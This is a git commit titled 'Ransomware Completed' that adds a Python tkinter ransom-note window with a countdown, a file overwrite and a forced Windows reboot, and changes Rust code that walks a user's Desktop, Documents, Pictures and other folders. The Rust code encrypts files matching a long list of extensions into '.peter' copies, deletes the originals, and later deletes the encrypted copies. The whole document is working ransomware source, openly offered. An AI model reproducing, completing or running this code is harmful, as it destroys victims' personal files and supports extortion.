785e5147b350b92386fdca99ef98ce9b6127472b
sudo0x18 <jayvadhaiya2002@gmail.com>
2024-04-21 18:04:56 +0530

    Ransomware Completed

---
+++ ransomnote.py
@@ -0,0 +1,77 @@
+import tkinter as tk
+import datetime
+import sys
+import os
+
+class RansomwareApp(tk.Tk):
+    def __init__(self, file_path):
+        tk.Tk.__init__(self)
+        self.title("Peter's Ransomware")
+        self.configure(bg='red')
+        self.geometry("600x400")
+        self.file_path = file_path
+        self.load_file()
+        self.create_widgets()
+
+    def load_file(self):
+        try:
+            with open(self.file_path, 'rb') as file:
+                month = int.from_bytes(file.read(1), 'big')
+                day = int.from_bytes(file.read(1), 'big')
+                self.delete_date = datetime.datetime(datetime.datetime.now().year, month, day)
+                self.seconds_left = (self.delete_date - datetime.datetime.now()).total_seconds()
+        except FileNotFoundError:
+            self.show_error_message("File not found")
+            self.destroy()
+
+    def create_widgets(self):
+        self.upper_frame = tk.Frame(self, bg="red")
+        self.upper_frame.pack(fill=tk.X)
+
+        self.oops_label = tk.Label(self.upper_frame, text="Oops! Your files have been encrypted.", bg='red', fg="white", font=("Comic Sans MS", 16))
+        self.oops_label.pack(pady=20)
+
+        self.note_frame = tk.Frame(self, bg="white")
+        self.note_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+
+        note_text = (
+            "What happened to my computer?\n"
+            "All your important personal files have been encrypted,\n"
+            "and all of these documents are no longer accessible.\n\n"
+            "Please pay $69 for us to decrypt your files :P"
+        )
+        self.note_label = tk.Label(self.note_frame, text=note_text, bg="white", fg="black", font=("Comic Sans MS", 12))
+        self.note_label.pack(pady=20, padx=40, fill=tk.BOTH)
+
+        self.info_frame = tk.Frame(self, bg="red")
+        self.info_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+
+        delete_date_text = "Your files will be lost on\n{}".format(self.delete_date)
+        self.delete_date_label = tk.Label(self.info_frame, text=delete_date_text, bg="red", fg="black", font=("Comic Sans MS", 18, "bold"))
+        self.delete_date_label.pack(pady=20)
+
+        self.time_left_label = tk.Label(self.info_frame, text="Time Left", bg="red", fg="black", font=("Comic Sans MS", 18, "bold"))
+        self.time_left_label.pack(pady=10)
+
+        self.time_label = tk.Label(self.info_frame, text="", bg="red", fg="black", font=("Comic Sans MS", 18, "bold"))
+        self.time_label.pack(pady=10)
+
+        self.update_clock()
+
+    def update_clock(self):
+        if self.seconds_left <= 0:
+            self.time_label.config(text="Time is up!")
+            with open(self.file_path, 'wb') as file:
+                file.write(b'\x99\x99')
+            os.system("shutdown /r /t 1")
+        else:
+            self.time_label.config(text=str(datetime.timedelta(seconds=self.seconds_left)))
+            self.seconds_left -= 1
+            self.after(1000, self.update_clock)
+
+    def show_error_message(self, message):
+        tk.messagebox.showerror("Error", message)
+
+if __name__ == "__main__":
+    app = RansomwareApp(sys.argv[1])
+    app.mainloop()
--- src/traversing.rs
+++ src/traversing.rs
@@ -1,25 +1,27 @@
 #[cfg(windows)]
 extern crate winapi;
 
-
+use crate::encryption::encrypt;
 use std::ffi::CString;
 use std::ptr::null_mut;
 use std::str;
-use winapi::um::fileapi::{CreateFileA, DeleteFileA, FindFirstFileA, FindNextFileA, WriteFile};
-use winapi::um::fileapi::{OPEN_ALWAYS};
+use winapi::shared::minwindef::FILETIME;
+use winapi::um::fileapi::WriteFile;
+use winapi::um::fileapi::{CreateFileA, OPEN_ALWAYS};
+use winapi::um::fileapi::{DeleteFileA, FindFirstFileA, FindNextFileA};
 use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
 use winapi::um::minwinbase::{SYSTEMTIME, WIN32_FIND_DATAA};
 use winapi::um::sysinfoapi::GetSystemTime;
 use winapi::um::winbase::GetUserNameA;
-use winapi::um::winnt::{FILE_ATTRIBUTE_DIRECTORY, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_WRITE_DATA, GENERIC_ALL, HANDLE};
-use crate::encryption::encrypt;
-
+use winapi::um::winnt::{
+    FILE_ATTRIBUTE_DIRECTORY, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_WRITE_DATA, GENERIC_ALL,
+    HANDLE,
+};
 // traverse_and_encrypt will populate this vector
-static mut VALID_EXTENSIONS: Vec<&str> = Vec::new();
-
+static mut VALID_EXTENSION_VEC: Vec<&str> = Vec::new();
 pub fn traverse_and_encrypt() {
     unsafe {
-        let extensions = [
+        let ext = [
             ".pl", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".d3dbsp", ".sc2save", ".sie",
             ".sum", ".bkp", ".flv", ".js", ".raw", ".jpeg", ".tar", ".zip", ".tar.gz", ".cmd",
             ".key", ".DOT", ".docm", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
@@ -27,13 +29,13 @@ pub fn traverse_and_encrypt() {
             ".html", ".xml", ".psd", ".bmp", ".pdf", ".py", ".rtf",
         ];
 
-        // push all valid extensions into VALID_EXTENSIONS
-        for extension in extensions.iter() {
-            VALID_EXTENSIONS.push(*extension);
+        // push all valid extension into VALID_EXTENSION_VEC
+        for each in ext.iter() {
+            VALID_EXTENSION_VEC.push(each.clone());
         }
     }
 
-    // Directories to traverse for encryption
+    // We will traverse through these directories to encrypt files. We don't need to touch anything else.
     let dir_names = [
         "Contacts",
         "Desktop",
@@ -50,19 +52,18 @@ pub fn traverse_and_encrypt() {
         "Videos",
     ];
 
-    // Getting the username of the machine
+    // getting the username of the machine
     let mut size: u32 = 0;
     let mut buffer: Vec<i8> = Vec::new();
     let mut user_name: Vec<u8> = Vec::new();
-
     unsafe {
-        // Get length of name
+        // get length of name
         GetUserNameA(null_mut(), &mut size);
         buffer.resize(size as usize, 0i8);
-        // Get username
+        // get username
         GetUserNameA(buffer.as_mut_ptr(), &mut size);
         user_name = std::mem::transmute(buffer);
-        user_name.resize((size - 1) as usize, 0u8); // Eliminate the null terminator
+        user_name.resize((size - 1) as usize, 0u8); // eliminate the null terminator
 
         for dir in dir_names.iter() {
             let mut full_path = String::from("C:\\Users\\");
@@ -70,7 +71,7 @@ pub fn traverse_and_encrypt() {
             full_path.push_str("\\");
             full_path.push_str(dir.clone());
             full_path.push_str("\\*");
-            // Extract path and call traverse
+            // extract path and call traverse
             let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
             traverse(full_path);
         }
@@ -125,11 +126,32 @@ pub fn traverse_and_encrypt() {
 
 fn traverse(dir_name: CString) {
     unsafe {
-        let mut file_data: WIN32_FIND_DATAA = std::mem::zeroed();
+        let mut file_data: WIN32_FIND_DATAA = WIN32_FIND_DATAA {
+            dwFileAttributes: 0,
+            ftCreationTime: FILETIME {
+                dwLowDateTime: 0,
+                dwHighDateTime: 0,
+            },
+            ftLastAccessTime: FILETIME {
+                dwLowDateTime: 0,
+                dwHighDateTime: 0,
+            },
+            ftLastWriteTime: FILETIME {
+                dwLowDateTime: 0,
+                dwHighDateTime: 0,
+            },
+            nFileSizeHigh: 0,
+            nFileSizeLow: 0,
+            dwReserved0: 0,
+            dwReserved1: 0,
+            cFileName: [0i8; 260],
+            cAlternateFileName: [0i8; 14],
+        };
+
         let mut hFind: HANDLE = INVALID_HANDLE_VALUE;
         hFind = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
         if hFind == INVALID_HANDLE_VALUE {
-            // If path is not valid, return
+            // if path not valid, return
             return;
         }
 
@@ -137,40 +159,49 @@ fn traverse(dir_name: CString) {
             let mut name_buffer: Vec<u8> = Vec::new();
 
             for byte in file_data.cFileName.iter() {
-                if *byte == 0 {
+                if byte.clone() == 0 {
                     break;
                 }
-                name_buffer.push(*byte as u8);
+                name_buffer.push(byte.clone() as u8);
             }
 
             if file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 {
                 let curr = dir_name.as_bytes();
                 let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
-                let dot_position = new_dir.iter().rposition(|&x| x == b'.');
-                if let Some(dot_position) = dot_position {
-                    let extension: Vec<u8> = new_dir[dot_position..].to_vec();
+                let dot_position = new_dir.as_mut_slice().iter().rposition(|x| *x == 46);
+                let dot_position = dot_position.unwrap();
+                let mut extension: Vec<u8> = Vec::new();
+                for i in dot_position..new_dir.len() {
+                    extension.push(new_dir[i]);
+                }
 
-                    if VALID_EXTENSIONS.iter().any(|&x| x == str::from_utf8(&extension).unwrap()) {
-                        let source_file_name = new_dir.clone();
-                        let mut dest_file_name = source_file_name.clone();
-                        dest_file_name.extend_from_slice(b".jay");
-                        encrypt(
-                            CString::new(&source_file_name[..]).unwrap(),
-                            CString::new(&dest_file_name[..]).unwrap(),
-                        );
-                        DeleteFileA(CString::new(&source_file_name[..]).unwrap().as_ptr());
+                if VALID_EXTENSION_VEC
+                    .iter()
+                    .any(|&x| CString::new(x).unwrap() == CString::new(&extension[..]).unwrap())
+                {
+                    let mut source_file_name = new_dir.clone();
+                    let mut dest_file_name: Vec<u8> = Vec::new();
+                    for byte in source_file_name[..].iter() {
+                        dest_file_name.push(byte.clone());
                     }
+                    for byte in ".peter".as_bytes().iter() {
+                        dest_file_name.push(byte.clone());
+                    }
+                    encrypt(
+                        CString::new(&source_file_name[..]).unwrap(),
+                        CString::new(&dest_file_name[..]).unwrap(),
+                    );
+                    DeleteFileA(CString::new(&source_file_name[..]).unwrap().as_ptr());
                 }
             } else {
-                // Directory
+                // directory
                 let name = str::from_utf8(&name_buffer).unwrap();
-                if !((name_buffer.len() == 1 && name_buffer[0] == b'.')
-                    || (name_buffer.len() == 2 && name_buffer[0] == b'.' && name_buffer[1] == b'.'))
+                if !((name_buffer.len() == 1 && name_buffer[0] == 46u8)
+                    || (name_buffer.len() == 2 && name_buffer[0] == 46u8 && name_buffer[1] == 46u8))
                 {
                     let curr = dir_name.as_bytes();
                     let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
-                    let wildcard: Vec<u8> = "\\*".as_bytes().to_vec();
-                    new_dir.extend_from_slice(&wildcard);
+                    new_dir = [&new_dir, "\\*".as_bytes()].concat();
                     traverse(CString::new(new_dir).unwrap());
                 }
             }
@@ -183,7 +214,7 @@ fn traverse(dir_name: CString) {
 }
 
 pub fn traverse_and_delete() {
-    // Directories to traverse for deletion
+    // We will traverse through these directories to encrypt files. We don't need to touch anything else.
     let dir_names = [
         "Contacts",
         "Desktop",
@@ -200,19 +231,18 @@ pub fn traverse_and_delete() {
         "Videos",
     ];
 
-    // Getting the username of the machine
+    // getting the username of the machine
     let mut size: u32 = 0;
     let mut buffer: Vec<i8> = Vec::new();
     let mut user_name: Vec<u8> = Vec::new();
-
     unsafe {
-        // Get length of name
+        // get length of name
         GetUserNameA(null_mut(), &mut size);
         buffer.resize(size as usize, 0i8);
-        // Get username
+        // get username
         GetUserNameA(buffer.as_mut_ptr(), &mut size);
         user_name = std::mem::transmute(buffer);
-        user_name.resize((size - 1) as usize, 0u8); // Eliminate the null terminator
+        user_name.resize((size - 1) as usize, 0u8); // eliminate the null terminator
 
         for dir in dir_names.iter() {
             let mut full_path = String::from("C:\\Users\\");
@@ -220,7 +250,7 @@ pub fn traverse_and_delete() {
             full_path.push_str("\\");
             full_path.push_str(dir.clone());
             full_path.push_str("\\*");
-            // Extract path and call delete
+            // extract path and call traverse
             let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
             delete(full_path);
         }
@@ -229,11 +259,32 @@ pub fn traverse_and_delete() {
 
 fn delete(dir_name: CString) {
     unsafe {
-        let mut file_data: WIN32_FIND_DATAA = std::mem::zeroed();
+        let mut file_data: WIN32_FIND_DATAA = WIN32_FIND_DATAA {
+            dwFileAttributes: 0,
+            ftCreationTime: FILETIME {
+                dwLowDateTime: 0,
+                dwHighDateTime: 0,
+            },
+            ftLastAccessTime: FILETIME {
+                dwLowDateTime: 0,
+                dwHighDateTime: 0,
+            },
+            ftLastWriteTime: FILETIME {
+                dwLowDateTime: 0,
+                dwHighDateTime: 0,
+            },
+            nFileSizeHigh: 0,
+            nFileSizeLow: 0,
+            dwReserved0: 0,
+            dwReserved1: 0,
+            cFileName: [0i8; 260],
+            cAlternateFileName: [0i8; 14],
+        };
+
         let mut h_find: HANDLE = INVALID_HANDLE_VALUE;
         h_find = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
         if h_find == INVALID_HANDLE_VALUE {
-            // If path is not valid, return
+            // if path not valid, return
             return;
         }
 
@@ -241,34 +292,35 @@ fn delete(dir_name: CString) {
             let mut name_buffer: Vec<u8> = Vec::new();
 
             for byte in file_data.cFileName.iter() {
-                if *byte == 0 {
+                if byte.clone() == 0 {
                     break;
                 }
-                name_buffer.push(*byte as u8);
+                name_buffer.push(byte.clone() as u8);
             }
 
             if file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 {
                 let curr = dir_name.as_bytes();
                 let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
-                let dot_position = new_dir.iter().rposition(|&x| x == b'.');
-                if let Some(dot_position) = dot_position {
-                    let extension: Vec<u8> = new_dir[dot_position..].to_vec();
+                let dot_position = new_dir.as_mut_slice().iter().rposition(|x| *x == 46);
+                let dot_position = dot_position.unwrap();
+                let mut extension: Vec<u8> = Vec::new();
+                for i in dot_position..new_dir.len() {
+                    extension.push(new_dir[i]);
+                }
 
-                    if String::from_utf8(extension).unwrap() == ".jay".to_string() {
-                        DeleteFileA(CString::new(new_dir).unwrap().as_ptr());
-                    }
+                if String::from_utf8(extension).unwrap() == ".peter".to_string() {
+                    DeleteFileA(CString::new(new_dir).unwrap().as_ptr());
                 }
             } else {
-                // Directory
+                // directory
                 let name = str::from_utf8(&name_buffer).unwrap();
-                if !((name_buffer.len() == 1 && name_buffer[0] == b'.')
-                    || (name_buffer.len() == 2 && name_buffer[0] == b'.' && name_buffer[1] == b'.'))
+                if !((name_buffer.len() == 1 && name_buffer[0] == 46u8)
+                    || (name_buffer.len() == 2 && name_buffer[0] == 46u8 && name_buffer[1] == 46u8))
                 {
                     let curr = dir_name.as_bytes();
                     let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
-                    let wildcard: Vec<u8> = "\\*".as_bytes().to_vec();
-                    new_dir.extend_from_slice(&wildcard);
-                    delete(CString::new(new_dir).unwrap());
+                    new_dir = [&new_dir, "\\*".as_bytes()].concat();
+                    traverse(CString::new(new_dir).unwrap());
                 }
             }
 
